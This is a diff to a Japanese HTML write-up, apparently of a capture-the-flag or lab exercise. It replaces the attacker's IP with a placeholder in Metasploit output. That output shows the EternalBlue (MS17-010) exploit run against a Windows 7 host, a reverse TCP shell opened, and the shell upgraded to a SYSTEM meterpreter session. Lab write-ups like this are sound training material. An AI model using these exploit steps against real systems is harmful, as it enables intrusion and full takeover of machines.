@@ -235,7 +235,7 @@ LHOSTも設定しなおしたほうがいい気がする</p>
 <pre><code class="language-bash">msf exploit(windows/smb/ms17_010_eternalblue) &gt; set RHOSTS 10.48.144.95
 RHOSTS =&gt; 10.48.144.95
 msf exploit(windows/smb/ms17_010_eternalblue) &gt; set LHOST tun0
-LHOST =&gt; 10.10.14.5
+LHOST =&gt; &lt;YOUR_TUN0_IP&gt;
 msf exploit(windows/smb/ms17_010_eternalblue) &gt; show options
 
 Module options (exploit/windows/smb/ms17_010_eternalblue):
@@ -259,7 +259,7 @@ Payload options (windows/x64/meterpreter/reverse_tcp):
    Name      Current Setting  Required  Description
    ----      ---------------  --------  -----------
    EXITFUNC  thread           yes       Exit technique (Accepted: '', seh, thread, process, none)
-   LHOST     10.10.14.5  yes       The listen address (an interface may be specified)
+   LHOST     &lt;YOUR_TUN0_IP&gt;  yes       The listen address (an interface may be specified)
    LPORT     4444             yes       The listen port
 
 
@@ -303,7 +303,7 @@ Payload options (windows/x64/shell/reverse_tcp):
    Name      Current Setting  Required  Description
    ----      ---------------  --------  -----------
    EXITFUNC  thread           yes       Exit technique (Accepted: '', seh, thread, process, none)
-   LHOST     10.10.14.5  yes       The listen address (an interface may be specified)
+   LHOST     &lt;YOUR_TUN0_IP&gt;  yes       The listen address (an interface may be specified)
    LPORT     4444             yes       The listen port
 
 
@@ -323,7 +323,7 @@ msf exploit(windows/smb/ms17_010_eternalblue) &gt;
 LHOSTはそのままだ</p>
 <p>では実行する</p>
 <pre><code class="language-bash">msf exploit(windows/smb/ms17_010_eternalblue) &gt; run
-[*] Started reverse TCP handler on 10.10.14.5:4444 
+[*] Started reverse TCP handler on &lt;YOUR_TUN0_IP&gt;:4444 
 [*] 10.48.144.95:445 - Using auxiliary/scanner/smb/smb_ms17_010 as check
 [+] 10.48.144.95:445      - Host is likely VULNERABLE to MS17-010! - Windows 7 Professional 7601 Service Pack 1 x64 (64-bit)
 /usr/share/metasploit-framework/vendor/bundle/ruby/3.3.0/gems/recog-3.1.26/lib/recog/fingerprint/regexp_factory.rb:34: warning: nested repeat operator '+' and '?' was replaced with '*' in regular expression
@@ -352,7 +352,7 @@ LHOSTはそのままだ</p>
 [+] 10.48.144.95:445 - =-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
 [+] 10.48.144.95:445 - =-=-=-=-=-=-=-=-=-=-=-=-=-WIN-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
 [+] 10.48.144.95:445 - =-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
-[*] Command shell session 1 opened (10.10.14.5:4444 -&gt; 10.48.144.95:49251) at 2026-05-12 09:31:57 +0900
+[*] Command shell session 1 opened (&lt;YOUR_TUN0_IP&gt;:4444 -&gt; 10.48.144.95:49251) at 2026-05-12 09:31:57 +0900
 
 
 Shell Banner:
@@ -416,7 +416,7 @@ Active sessions
 
   Id  Name  Type               Information                                               Connection
   --  ----  ----               -----------                                               ----------
-  1         shell x64/windows  Shell Banner: Microsoft Windows [Version 6.1.7601] -----  10.10.14.5:4444 -&gt; 10.48.144.95:49251 (10.48.144.95)
+  1         shell x64/windows  Shell Banner: Microsoft Windows [Version 6.1.7601] -----  &lt;YOUR_TUN0_IP&gt;:4444 -&gt; 10.48.144.95:49251 (10.48.144.95)
 
 msf post(multi/manage/shell_to_meterpreter) &gt; 
 </code></pre>
@@ -443,12 +443,12 @@ msf &gt;
 <pre><code class="language-bash">msf post(multi/manage/shell_to_meterpreter) &gt; run
 [*] Upgrading session ID: 2
 [*] Starting exploit/multi/handler
-[*] Started reverse TCP handler on 10.10.14.5:4433 
+[*] Started reverse TCP handler on &lt;YOUR_TUN0_IP&gt;:4433 
 [*] Post module execution completed
 msf post(multi/manage/shell_to_meterpreter) &gt; 
 [*] Sending stage (248902 bytes) to 10.48.134.187
 [*] Stopping exploit/multi/handler
-[*] Meterpreter session 3 opened (10.10.14.5:4433 -&gt; 10.48.134.187:49244) at 2026-05-12 11:51:25 +0900
+[*] Meterpreter session 3 opened (&lt;YOUR_TUN0_IP&gt;:4433 -&gt; 10.48.134.187:49244) at 2026-05-12 11:51:25 +0900
 
 msf post(multi/manage/shell_to_meterpreter) &gt; 
 msf post(multi/manage/shell_to_meterpreter) &gt; sessions
@@ -458,8 +458,8 @@ Active sessions
 
   Id  Name  Type                     Information                                               Connection
   --  ----  ----                     -----------                                               ----------
-  2         shell x64/windows        Shell Banner: Microsoft Windows [Version 6.1.7601] -----  10.10.14.5:4444 -&gt; 10.48.134.187:49231 (10.48.134.187)
-  3         meterpreter x64/windows  NT AUTHORITY\SYSTEM @ JON-PC                              10.10.14.5:4433 -&gt; 10.48.134.187:49244 (10.48.134.187)
+  2         shell x64/windows        Shell Banner: Microsoft Windows [Version 6.1.7601] -----  &lt;YOUR_TUN0_IP&gt;:4444 -&gt; 10.48.134.187:49231 (10.48.134.187)
+  3         meterpreter x64/windows  NT AUTHORITY\SYSTEM @ JON-PC                              &lt;YOUR_TUN0_IP&gt;:4433 -&gt; 10.48.134.187:49244 (10.48.134.187)
 
 msf post(multi/manage/shell_to_meterpreter) &gt; 
 </code></pre>
